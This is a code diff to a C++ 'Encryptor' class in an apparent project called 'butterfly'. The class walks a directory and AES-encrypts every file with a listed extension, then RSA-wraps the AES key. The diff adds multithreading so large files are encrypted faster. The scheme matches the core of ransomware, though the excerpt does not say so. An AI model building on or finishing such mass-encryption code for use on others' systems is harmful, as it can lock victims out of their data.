@@ -46,8 +46,12 @@ void Encryptor::invokeDir(const std::string &dirPath, bool protection)
     // Get all files from provided directory path
     auto files =  DirectoryIterator::getAllFiles(dirPath);
 
-    // Generate and validate the AES Key and IV
-    validateAESKeyLength();
+    if ( !aes::AESEncryptor::initDone() )
+    {
+        // Generate and validate the AES Key and IV
+        validateAESKeyLength();
+    }
+
     // Get the AESKeyPair(AESKey + AESIV)
     std::string aeskeypair = _aesEncryptor->getAESKeyPair();
 
@@ -64,10 +68,24 @@ void Encryptor::invokeDir(const std::string &dirPath, bool protection)
         // Check if the provided file extension is part of the fileExtensionVector
         if ( std::find(butterfly::fileExtensionVec.begin(), butterfly::fileExtensionVec.end(), DirectoryIterator::getFileExtension(file)) != butterfly::fileExtensionVec.end() )
         {
-            encryptFileWithAES(file.string());
+
+            // Compare file size with the MAX FILE SIZE
+            if ( butterfly::getFileSize(file.string(), true) > butterfly::MAX_FILE_SIZE)
+            {
+                LOG_TRACE("Spawn a new encryption thread for file: " << file.string());
+                spawnThread(file.string());
+            } else
+            {
+                encryptFileWithAES(file.string());
+            }
+
+            //butterfly::FileEncryptor _t(file.string(), false);
         }
 
     }
+
+    // join threads for the bigger file encryption
+    joinThreads();
 
     // Save the final AESKey.bin file
     encryptFinalAESKeyWithRSA(aeskeypair, butterfly::ENC_AESKEY_FILENAME);
@@ -132,6 +150,21 @@ void Encryptor::encryptFinalAESKeyWithRSA(const std::string &aesKeyStr, const st
         LOG_ERROR(e.what());
     }
 
+}
+
+void Encryptor::spawnThread(const std::string &filepath)
+{
+    std::thread t(&Encryptor::encryptFileWithAES, this, filepath);
+    _threads.push_back(std::move(t));
+}
+
+void Encryptor::joinThreads()
+{
+    for (auto &t: _threads)
+    {
+        if (t.joinable())
+            t.join();
+    }
 }
 
 } // namespace hybrid
